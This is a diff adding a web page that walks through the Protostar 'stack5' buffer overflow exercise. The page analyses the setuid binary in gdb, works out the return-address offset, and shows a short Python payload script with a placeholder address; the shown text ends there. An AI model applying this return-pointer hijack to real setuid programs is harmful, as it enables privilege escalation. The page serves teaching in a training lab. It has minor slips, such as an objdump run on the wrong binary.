@@ -1,0 +1,801 @@
+<h1 id="protostar---stack-5">Protostar - Stack 5</h1>
+
+<h2 id="target-binary">Target Binary</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>File</td>
+      <td>stack5 (https://exploit-exercises.lains.space/protostar/)</td>
+    </tr>
+    <tr>
+      <td>OS</td>
+      <td>GNU/Linux 2.6.18</td>
+    </tr>
+    <tr>
+      <td>Format</td>
+      <td>setuid ELF 32-bit LSB executable</td>
+    </tr>
+    <tr>
+      <td>ASLR</td>
+      <td>Not enabled</td>
+    </tr>
+    <tr>
+      <td>Stack canaries</td>
+      <td>Not enabled</td>
+    </tr>
+    <tr>
+      <td>NX</td>
+      <td>Not enabled</td>
+    </tr>
+    <tr>
+      <td>Symbol data</td>
+      <td>Available</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="walkthrough">Walkthrough</h2>
+
+<h3 id="analyze-file">Analyze file</h3>
+
+<p>To obtain general information about the file, the <code class="highlighter-rouge">file</code> command was used on the target binary:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@protostar:/opt/protostar/bin<span class="nv">$ </span>file stack5
+stack5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.18, not stripped
+</code></pre></div></div>
+
+<p>Some interesting facts about the file are:</p>
+<ol>
+  <li>It has <code class="highlighter-rouge">setuid</code> property which indicates that the program is run with the privileges of the owner. In this case, owner is root. So it can be used to escalate privileges.</li>
+</ol>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">-rwsr-xr-x</span> 1 root root 22612 Nov 24  2011 stack5
+</code></pre></div></div>
+
+<ol>
+  <li>The file is an <code class="highlighter-rouge">ELF 32-bit LSB executable, Intel 80386</code>. Elf is the file format, 32-bit is the word size, LSB means that least significant bytes first (Little endian) and Intel 80386 (x86) is the instruction set used.</li>
+  <li>The file has symbols, as indicated by the <code class="highlighter-rouge">not stripped</code> attribute. This is particularly helpful as we can see the original variables and function names during the debug/analysis process.</li>
+  <li>The file uses shared libraries, as it is dynamically linked. This means that it uses existing libraries in our system as part of its execution. This is helpful as it helps to identify common libraries used in the binary.</li>
+</ol>
+
+<p>By checking the program headers of our binary it is possible to see that the stack is marked as executable. This is an indication that we could use the stack to store arbitrary code that can be executed directly if control flow of the binary is hijacked (Arbitrary code execution is commonly used to gain control of a victim’s machine):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>readelf <span class="nt">-l</span> stack5
+...
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
+  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
+      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08048000 0x08048000 0x004a4 0x004a4 R E 0x1000
+  LOAD           0x0004a4 0x080494a4 0x080494a4 0x00108 0x00110 RW  0x1000
+  DYNAMIC        0x0004b8 0x080494b8 0x080494b8 0x000d0 0x000d0 RW  0x4
+  NOTE           0x000128 0x08048128 0x08048128 0x00044 0x00044 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4 <span class="p">;</span> Flags: R <span class="o">=</span> Read W <span class="o">=</span> Write E <span class="o">=</span> Execute
+</code></pre></div></div>
+
+<p>By running GDB on the binary multiple times, it is possible to appreciate that subsequent runs always show the same addresses for the <code class="highlighter-rouge">main</code> function stack. This means that ASLR (Address Space Layout Randomization) is disabled. This is useful since exploits that require to know specific addresses in the system can be used (such as stack overflow, ROP, etc…).</p>
+
+<p><strong>Run 1:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r
+The program being debugged has been started already.
+Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+Starting program: /opt/protostar/bin/stack5 &lt; ~/in.txt
+
+Breakpoint 6, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffff854<span class="o">)</span> at stack5/stack5.c:10
+10	<span class="k">in </span>stack5/stack5.c
+<span class="o">(</span>gdb<span class="o">)</span> x <span class="nv">$esp</span>
+0xbffff750:	0xb7fd7ff4
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p><strong>Run 2:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r
+The program being debugged has been started already.
+Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
+Starting program: /opt/protostar/bin/stack5 &lt; ~/in.txt
+
+Breakpoint 6, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffff854<span class="o">)</span> at stack5/stack5.c:10
+10	<span class="k">in </span>stack5/stack5.c
+<span class="o">(</span>gdb<span class="o">)</span> x <span class="nv">$esp</span>
+0xbffff750:	0xb7fd7ff4
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>By observing a decompiled function of the program, it is possible to determine if the executable was compiled with stack protection (or stack canaries). As it will only show only the base pointer (EBP) pushed into the stack but nothing else.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@protostar:/opt/protostar/bin<span class="nv">$ </span>objdump <span class="nt">-dj</span> .text stack5 | <span class="nb">grep</span> <span class="nt">-A10</span> <span class="s2">"&lt;main&gt;:"</span>
+080483c4 &lt;main&gt;:
+ 80483c4:	55                   	push   %ebp
+ 80483c5:	89 e5                	mov    %esp,%ebp
+ 
+ <span class="p">;</span> A stack protected binary would have some stack guards here
+ <span class="p">;</span> that would like something like this:
+ <span class="p">;</span>mov    %fs:0x28,%rax     &lt;- get guard variable value
+ <span class="p">;</span>mov    %rax,-0x8<span class="o">(</span>%rbp<span class="o">)</span>   &lt;- save guard variable on stack
+ 
+ 80483c7:	83 e4 f0             	and    <span class="nv">$0xfffffff0</span>,%esp
+ 80483ca:	83 ec 50             	sub    <span class="nv">$0x50</span>,%esp
+ 80483cd:	8d 44 24 10          	lea    0x10<span class="o">(</span>%esp<span class="o">)</span>,%eax
+ 80483d1:	89 04 24             	mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80483d4:	e8 0f ff ff ff       	call   80482e8 &lt;gets@plt&gt;
+ 
+ <span class="p">;</span>Cont.
+ <span class="p">;</span>xor    %eax,%eax
+ <span class="p">;</span>mov    <span class="nt">-0x14</span><span class="o">(</span>%rbp<span class="o">)</span>,%eax
+ <span class="p">;</span>mov    <span class="nt">-0x8</span><span class="o">(</span>%rbp<span class="o">)</span>,%rdx   &lt;- move it to register
+ <span class="p">;</span>xor    %fs:0x28,%rdx     &lt;- check it against original
+ <span class="p">;</span>je     40058e &lt;main+0xX&gt;
+ <span class="p">;</span>callq  400440 &lt;__stack_chk_fail@plt&gt; &lt;- Fail <span class="k">if </span>stack was manipulated
+ 
+ 80483d9:	c9                   	leave  
+ 80483da:	c3                   	ret    
+ 80483db:	90                   	nop
+</code></pre></div></div>
+
+<h3 id="analyze-symbols">Analyze symbols</h3>
+
+<p>We will list the functions available since symbols are not stripped.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info functions
+All defined functions:
+
+File stack5/stack5.c:
+int main<span class="o">(</span>int, char <span class="k">**</span><span class="o">)</span><span class="p">;</span>
+
+Non-debugging symbols:
+0x08048298  _init
+0x080482d8  __gmon_start__
+0x080482d8  __gmon_start__@plt
+0x080482e8  gets
+0x080482e8  gets@plt
+0x080482f8  __libc_start_main
+0x080482f8  __libc_start_main@plt
+0x08048310  _start
+0x08048340  __do_global_dtors_aux
+0x080483a0  frame_dummy
+0x080483e0  __libc_csu_fini
+0x080483f0  __libc_csu_init
+0x0804844a  __i686.get_pc_thunk.bx
+0x08048450  __do_global_ctors_aux
+0x0804847c  _fini
+</code></pre></div></div>
+<p>We also executed the next objdump command (-M intel to set intel flavor mode, -T to list the dynamic symbol table and -C to demangle the functions):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$objdump</span> <span class="nt">-M</span> intel <span class="nt">-TC</span> stack4
+DYNAMIC SYMBOL TABLE:
+00000000  w   D  <span class="k">*</span>UND<span class="k">*</span>	00000000              __gmon_start__
+00000000      DF <span class="k">*</span>UND<span class="k">*</span>	00000000  GLIBC_2.0   gets
+00000000      DF <span class="k">*</span>UND<span class="k">*</span>	00000000  GLIBC_2.0   __libc_start_main
+00000000      DF <span class="k">*</span>UND<span class="k">*</span>	00000000  GLIBC_2.0   puts
+080484dc g    DO .rodata	00000004  Base        _IO_stdin_used
+</code></pre></div></div>
+
+<h3 id="analyze-binary-flow">Analyze binary flow</h3>
+
+<p>It seems that there is not much going on in the binary. Not many functions except from <code class="highlighter-rouge">gets</code>, <code class="highlighter-rouge">puts</code> and <code class="highlighter-rouge">main</code>. Let’s explore the main function to see the flow of the program.</p>
+
+<p>Let’s run the program and break on the main function.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb stack5
+<span class="o">(</span>gdb<span class="o">)</span> b main
+Breakpoint 1 at 0x80483cd: file stack5/stack5.c, line 10.
+<span class="o">(</span>gdb<span class="o">)</span> r
+Starting program: /opt/protostar/bin/stack5 
+
+Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffff854<span class="o">)</span> at stack5/stack5.c:10
+10	stack5/stack5.c: No such file or directory.
+	<span class="k">in </span>stack5/stack5.c
+</code></pre></div></div>
+
+<p>Let’s disassemble main, to see the flow of the program. First, we loaded the binary in gdb and set a breakpoint in the main function to disassemble it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 
+Dump of assembler code <span class="k">for function </span>main:
+0x080483c4 &lt;main+0&gt;:	push   ebp
+0x080483c5 &lt;main+1&gt;:	mov    ebp,esp
+0x080483c7 &lt;main+3&gt;:	and    esp,0xfffffff0
+0x080483ca &lt;main+6&gt;:	sub    esp,0x50
+0x080483cd &lt;main+9&gt;:	lea    eax,[esp+0x10]
+0x080483d1 &lt;main+13&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
+0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:	leave  
+0x080483da &lt;main+22&gt;:	ret    
+End of assembler dump.
+</code></pre></div></div>
+
+<p>Let’s breakdown what is going on in the main function:</p>
+<ol>
+  <li>The first four instructions correspond to the prologue of the function:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push   ebp               <span class="p">;</span> This saves the previous base pointer to the stack
+mov    ebp,esp           <span class="p">;</span> This sets the current base point to the current stack pointer value
+and    esp,0xfffffff0    <span class="p">;</span> <span class="k">*</span>This aligns the stack pointer to 16 bits.
+sub    esp,0x50          <span class="p">;</span> This allocates <span class="nb">local </span>variables <span class="k">for </span>this <span class="k">function in </span>the stack.
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p><em>*All x86 programs are 16-bit aligned. This is done since processor architectures have better performance on aligned memory. </em></p>
+
+<ol>
+  <li>The next three instructions correspond to a function call:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lea    eax,[esp+0x10]        <span class="p">;</span> Calculates an address based of the stack pointer + 0x10
+mov    DWORD PTR <span class="o">[</span>esp],eax   <span class="p">;</span> <span class="k">*</span>Moves the calculation to the top of the stack.
+call   0x80482e8 &lt;gets@plt&gt;  <span class="p">;</span> Calls the gets <span class="k">function</span><span class="nb">.</span>
+</code></pre></div>    </div>
+    <p><em>* Calling convention for x86 executables is to put the arguments to a function in the top of the stack before the doing call.</em></p>
+  </li>
+</ol>
+
+<p>From this we can appreciate that we are passing a pointer to SP + 0x10 as the argument to the <code class="highlighter-rouge">gets</code> function.</p>
+
+<p>We know that GLIBC_2.0 <code class="highlighter-rouge">gets</code> has the following definition, which is inline to what we see in the disassembly:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="o">*</span><span class="n">gets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ol>
+  <li>The last two instructions are the epilog of the main function:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x080483d9 &lt;main+21&gt;:	leave  <span class="p">;</span> Copies the ebp to the esp to restore the old ebp from the stack
+0x080483da &lt;main+22&gt;:	ret    <span class="p">;</span> Updates instruction pointer from the stack and returns to caller.
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="identify-the-vulnerability">Identify the vulnerability</h3>
+
+<p>In this case we know that <code class="highlighter-rouge">gets</code> is an inherently unsafe function. <code class="highlighter-rouge">gets</code> is supposed to read from stdin and copy the input into a buffer. The basic problem is that <code class="highlighter-rouge">gets</code> doesn’t know the length of the buffer, so it continues reading until it finds a newline or encounters EOF, and may overflow the bounds of the buffer it was given to it.</p>
+
+<p>From the disassembly we know that the buffer pointer we are passing is from the stack:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sub    esp,0x50          <span class="p">;</span> Allocates 0x50 bytes from the stack
+lea    eax,[esp+0x10]    <span class="p">;</span> <span class="k">*</span>Gives a pointer that is at offset 0x10 from the top of our stack
+</code></pre></div></div>
+<p><em>*The behavior of stack (growing up or growing down) depends on the application binary interface (ABI) and how the call stack is organized. In this case, the stack grows downwards.</em></p>
+
+<p>A stack frame represents a function call in a regular program. A normal stack frame (this can vary depending on architecture) looks like the following:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+ 0x00000000
+|                    |
+| Unallocated        |
+| memory             |
+|                    |
+|                    |
+|                    |
++--------------------+ Top of the stack
+| Local variables    |
+|                    |
++--------------------+
+| Previous base      |
+| pointer            |
++--------------------+
+| Return pointer     |
+|                    |
++--------------------+
+|                    |
+|                    |
+|                    |
+| Previous stack     |
+| Frame              |
+|                    |
++--------------------+ 0xFFFFFFFF
+</code></pre></div></div>
+
+<p>A stack frame gets created through the following steps:</p>
+<ol>
+  <li>Push the current instruction pointer (EIP) to the stack.
+<strong>Note</strong> The current instruction pointer points to the next instruction to execute.</li>
+  <li>Jump to the address where the callee implementation is in memory.</li>
+  <li>Save the current base pointer (EBP) (which points to the top of the start stack frame of the caller).</li>
+  <li>Store the current stack pointer (ESP) into the base pointer (EBP), since this is the start of the new stack frame.</li>
+  <li>Allocate the local variables’ memory.</li>
+</ol>
+
+<p>In our case #1 and #2 are depicted in a single instruction which is <code class="highlighter-rouge">call</code>.</p>
+
+<p>To illustrate this, let’s single-step through the <code class="highlighter-rouge">gets</code> function call:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
+0x080483d4	10	<span class="k">in </span>stack5/stack5.c <span class="p">;</span>&lt;main+16&gt;
+
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 
+Dump of assembler code <span class="k">for function </span>main:
+0x080483c4 &lt;main+0&gt;:	push   ebp
+0x080483c5 &lt;main+1&gt;:	mov    ebp,esp
+0x080483c7 &lt;main+3&gt;:	and    esp,0xfffffff0
+0x080483ca &lt;main+6&gt;:	sub    esp,0x50
+0x080483cd &lt;main+9&gt;:	lea    eax,[esp+0x10]
+0x080483d1 &lt;main+13&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
+0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:	leave  
+0x080483da &lt;main+22&gt;:	ret    
+
+<span class="o">(</span>gdb<span class="o">)</span> info registers
+eax            0xbffff760	<span class="nt">-1073744032</span>
+ecx            0x5d53dbb4	1565776820
+edx            0x1	1
+ebx            0xb7fd7ff4	<span class="nt">-1208123404</span>
+esp            0xbffff750	0xbffff750
+ebp            0xbffff7a8	0xbffff7a8
+esi            0x0	0
+edi            0x0	0
+eip            0x80483d4	0x80483d4 &lt;main+16&gt;
+eflags         0x200286	<span class="o">[</span> PF SF IF ID <span class="o">]</span>
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+<span class="o">(</span>gdb<span class="o">)</span> x/20x <span class="nv">$esp</span>
+0xbffff750:	0xbffff760	0xb7ec6165	0xbffff768	0xb7eada75
+0xbffff760:	0xb7fd7ff4	0x0804958c	0xbffff778	0x080482c4
+0xbffff770:	0xb7ff1040	0x0804958c	0xbffff7a8	0x08048409
+0xbffff780:	0xb7fd8304	0xb7fd7ff4	0x080483f0	0xbffff7a8
+0xbffff790:	0xb7ec6365	0xb7ff1040	0x080483fb	0xb7fd7ff4
+
+
+</code></pre></div></div>
+
+<p>As we can see above we are about to execute instruction <code class="highlighter-rouge">0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;</code> our instruction pointer EIP also shows this as it has <code class="highlighter-rouge">0x80483d4</code> as value. Let see what happens when we go into the function.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
+0x080482e8 <span class="k">in </span>gets@plt <span class="o">()</span>
+
+<span class="o">(</span>gdb<span class="o">)</span> info registers
+eax            0xbffff760	<span class="nt">-1073744032</span>
+ecx            0x5d53dbb4	1565776820
+edx            0x1	1
+ebx            0xb7fd7ff4	<span class="nt">-1208123404</span>
+esp            0xbffff74c	0xbffff74c
+ebp            0xbffff7a8	0xbffff7a8
+esi            0x0	0
+edi            0x0	0
+eip            0x80482e8	0x80482e8 &lt;gets@plt&gt; <span class="p">;</span> We are now going to the gets <span class="k">function
+</span>eflags         0x200286	<span class="o">[</span> PF SF IF ID <span class="o">]</span>
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+<span class="o">(</span>gdb<span class="o">)</span> x/20x <span class="nv">$esp</span>
+0xbffff74c:	0x080483d9	0xbffff760	0xb7ec6165	0xbffff768
+0xbffff75c:	0xb7eada75	0xb7fd7ff4	0x0804958c	0xbffff778
+0xbffff76c:	0x080482c4	0xb7ff1040	0x0804958c	0xbffff7a8
+0xbffff77c:	0x08048409	0xb7fd8304	0xb7fd7ff4	0x080483f0
+0xbffff78c:	0xbffff7a8	0xb7ec6365	0xb7ff1040	0x080483fb
+
+</code></pre></div></div>
+
+<p>By executing <em>call</em>, the program did two things, (#1) it jumped into the <code class="highlighter-rouge">gets</code> function as showed by our instruction pointer EIP and (#2) it pushed <code class="highlighter-rouge">0x080483d9</code> to our stack as well (which corresponds to <code class="highlighter-rouge">0x080483d9 &lt;main+21&gt;:    leave </code>).</p>
+
+<p>Let’s continue stepping in:</p>
+
+<p>Since we are calling into a dynamic library there will be some extra steps happening (loading the library and doing a lookup of the actual address of <code class="highlighter-rouge">gets</code>), but finally we arrive into the <code class="highlighter-rouge">gets</code> function which points to the<code class="highlighter-rouge">_IO_gets</code> in the GLIBC_2.0 library:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
+0xb7ef3e46	39	<span class="k">in </span>iogets.c
+
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 
+Dump of assembler code <span class="k">for function </span>_IO_gets:
+0xb7ef3e40 &lt;_IO_gets+0&gt;:	push   ebp
+0xb7ef3e41 &lt;_IO_gets+1&gt;:	mov    ebp,esp
+0xb7ef3e43 &lt;_IO_gets+3&gt;:	sub    esp,0x24
+0xb7ef3e46 &lt;_IO_gets+6&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0xc],ebx
+
+<span class="o">(</span>gdb<span class="o">)</span> x/12x <span class="nv">$esp</span>
+0xbffff724:	0xb7fd7ff4	0x00000000	0x00000000	0xbffff7a8
+0xbffff734:	0xb7ff6210	0x00000001	0xb7ef3e40	0xbffff760
+0xbffff744:	0xb7fff8f8	0xbffff7a8	0x080483d9	0xbffff760
+
+</code></pre></div></div>
+
+<p>As we enter the <code class="highlighter-rouge">gets</code> function the program will (#3) push the base pointer of the current stack frame (main’s stack frame) into the stack, (#4) setting te current stack pointer as the base pointer and (#5) it will allocate 0x24 bytes in the stack.</p>
+
+<p>As we can see in the printed stack above, the first 24 bytes are some allocated data used by gets, the next 4 bytes are <code class="highlighter-rouge">main</code>’s base pointer (0xbffff7a8) and the following 4 bytes are the return pointer (0x080483d9) or <code class="highlighter-rouge">&lt;main+21&gt;:    leave </code>.</p>
+
+<p>Based on our stack representation, we have the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------------+ 0x00000000
+|                    |
+| Unallocated        |
+| memory             |
+|                    |
+|                    |
+|                    |
++--------------------+---    -- Top of the stack (0xbffff724) --
+| Local variables    |  \
+| 0x24 bytes         |  \
++--------------------+  \ 
+| Previous EBP       |  \ &lt;---  gets' Stack Frame
+| (0xbffff7a8)       |  \
++--------------------+  \
+| Return pointer     |  \
+| (0x080483d9)       |  \
++--------------------+---  -- Stack pointer before calling gets (0xbffff750) --
+| Local variables    |  \
+| 0x50 bytes         |  \
++--------------------+  \ 
+| Previous EBP       |  \ &lt;---  mains' Stack Frame
+| (0xbffff828)       |  \
++--------------------+  \
+| Return pointer     |  \
+| (0xb7eadc76)       |  \
++--------------------+--- 0xbffff7b0
+| Previous Stack     |
+| Frame              |
+|                    |
++--------------------+ 0xFFFFFFFF
+</code></pre></div></div>
+
+<p>Based on the previous statements, we can exploit <code class="highlighter-rouge">gets</code> vulnerability to overwrite <code class="highlighter-rouge">main</code>’s return pointer and hijack the execution towards an address that we desire.</p>
+
+<p>We know that the buffer passed to <code class="highlighter-rouge">gets</code> resides in 0xbffff750 + 0x10 (Remember <code class="highlighter-rouge">main</code> dissasemble):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> si
+0x080483d1	10	<span class="k">in </span>stack5/stack5.c
+
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 
+Dump of assembler code <span class="k">for function </span>main:
+...
+0x080483cd &lt;main+9&gt;:	lea    eax,[esp+0x10]        <span class="p">;</span>0xbffff750 + 0x10
+0x080483d1 &lt;main+13&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
+0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;
+
+<span class="o">(</span>gdb<span class="o">)</span> x <span class="nv">$esp</span>
+0xbffff750:	0xb7fd7ff4 <span class="p">;</span> We care about the address not the value
+</code></pre></div></div>
+
+<p>The stack would look something like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                +--------------------+ 0x00000000
+                |                    |
+                | Unallocated        |
+                | memory             |
+                |                    |
+                |                    |
+                |                    |
+             +-----------------------+ &lt;------+ Top of the stack (0xbffff724)
+             |  | Local variables    |
+             |  | 0x24 bytes         |
+             |  +--------------------+
+             |  | Previous EBP       |
+ get's stack-&gt;  | (0xbffff7a8)       |
+ frame       |  +--------------------+
+             |  | Return pointer     |
+             |  | (0x080483d9)       |
+             +-----------------------+ &lt;------+ Stack pointer before calling gets (0xbffff750)
+             |  | Local variables    |
+             |  | 0x50 bytes         | &lt;------+ Pointer passed to gets (0xbffff750 + 0x10)
+             |  +--------------------+ &lt;------+ Main's EBP (0xbffff7a8)
+             |  | Previous EBP       |
+main's stack-&gt;  | (0xbffff828)       |
+frame        |  +--------------------+ &lt;------+ Main's Return Pointer (0xbffff7a8 +0x4)
+             |  | Return pointer     |
+             |  | (0xb7eadc76)       |
+             +-----------------------+ &lt;------+ Stack pointer before calling main (0xbffff7b0)
+                | Previous Stack     |
+                | Frame              |
+                |                    |
+                +--------------------+ 0xFFFFFFFF
+</code></pre></div></div>
+
+<p>The pointer passed to <code class="highlighter-rouge">gets</code> will be used to overwrite <code class="highlighter-rouge">mains</code>’s return pointer, like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                +--------------------+ 0x00000000
+                |                    |
+                | Unallocated        |
+                | memory             |
+                |                    |
+                |                    |
+                |                    |
+             +-----------------------+ &lt;------+ Top of the stack (0xbffff724)
+             |  | Local variables    |
+             |  | 0x24 bytes         |
+             |  +--------------------+
+             |  | Previous EBP       |
+ get's stack-&gt;  | (0xbffff7a8)       |
+ frame       |  +--------------------+
+             |  | Return pointer     |
+             |  | (0x080483d9)       |
+             +-----------------------+ &lt;------+ Stack pointer before calling gets (0xbffff750)
+             |  |                    |
+             |  +--------------------+ &lt;------+ Pointer passed to gets (0xbffff750 + 0x10)
+             |  |                    | &lt;------+ Main's EBP (0xbffff7a8)
+             |  | [malicious input]  |
+main's stack-&gt;  |                    |
+frame        |  +--------------------+ &lt;------+ Main's Return Pointer (0xbffff7ac)
+             |  | [Overwritten       |
+             |  | return address]    |
+             +-----------------------+ &lt;------+ Stack pointer before calling main (0xbffff7b0)
+                | Previous Stack     |
+                | Frame              |
+                |                    |
+                +--------------------+ 0xFFFFFFFF
+</code></pre></div></div>
+
+<p>We know <code class="highlighter-rouge">mains</code>’s EBP is 0xbffff7a8 (from the <code class="highlighter-rouge">gets</code>’ stack frame. A register in a 32bit architecture corresponds to 4 bytes. So <code class="highlighter-rouge">main</code>s caller EBP will be stored from  0xbffff7a8 to 0xbffff7ac. The value that follows in the stack after the saved EBP is the return pointer. The return address is stored at 0xbffff7ac (where the stored EBP ends). In order to overwrite the return address <code class="highlighter-rouge">gets</code> would need to write from 0xbffff760 to 0xbffff7b0, which is 80 bytes (76 padding + 4 new return address).</p>
+
+<h3 id="exploitation">Exploitation</h3>
+
+<h4 id="taking-control-of-execution">Taking control of execution</h4>
+
+<p>Based on the previous section, it is known that to overwrite <code class="highlighter-rouge">main</code>’s return pointer <code class="highlighter-rouge">gets</code> needs to read 80 bytes. This to overflow the local variable section, ebp section, and return pointer section of <code class="highlighter-rouge">main</code>’s stack frame.</p>
+
+<p>To achieve that we need to pass a payload similar to this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>76 bytes + return address
+</code></pre></div></div>
+
+<p>In order to do that, we can use the following python script. For now, the instruction pointer (return address) was set to 0x45454545:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="si">\</span><span class="se">xAA</span><span class="s">'</span> <span class="o">*</span> <span class="mi">76</span>
+<span class="n">returnPointer</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0x45454545</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">returnPointer</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>A file can be generated by executing this python script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@protostar:~<span class="nv">$ </span>python payload.py <span class="o">&gt;</span> <span class="k">in</span>.txt
+user@protostar:~<span class="nv">$ </span><span class="nb">cat </span><span class="k">in</span>.txt 
+����������������������������������������������������������������������������EEEE
+</code></pre></div></div>
+
+<p>Let’s use the <em>in.txt</em> as input to our program in GDB:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b main
+Breakpoint 6 at 0x80483cd: file stack5/stack5.c, line 10.
+<span class="o">(</span>gdb<span class="o">)</span> r &lt; ~/in.txt
+</code></pre></div></div>
+
+<p>A breakpoint in main was set so we can analyze how the stack is modified by the provided input. By analyzing the stack after the <code class="highlighter-rouge">gets</code> function was executed we can see the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info registers
+...
+esp            0xbffff750	0xbffff750
+ebp            0xbffff7a8	0xbffff7a8
+...
+eip            0x80483d9	0x80483d9 &lt;main+21&gt;
+...
+<span class="o">(</span>gdb<span class="o">)</span> disassemble 
+Dump of assembler code <span class="k">for function </span>main:
+0x080483c4 &lt;main+0&gt;:	push   ebp
+0x080483c5 &lt;main+1&gt;:	mov    ebp,esp
+0x080483c7 &lt;main+3&gt;:	and    esp,0xfffffff0
+0x080483ca &lt;main+6&gt;:	sub    esp,0x50
+0x080483cd &lt;main+9&gt;:	lea    eax,[esp+0x10]
+0x080483d1 &lt;main+13&gt;:	mov    DWORD PTR <span class="o">[</span>esp],eax
+0x080483d4 &lt;main+16&gt;:	call   0x80482e8 &lt;gets@plt&gt;
+0x080483d9 &lt;main+21&gt;:	leave  
+0x080483da &lt;main+22&gt;:	ret    
+End of assembler dump.
+
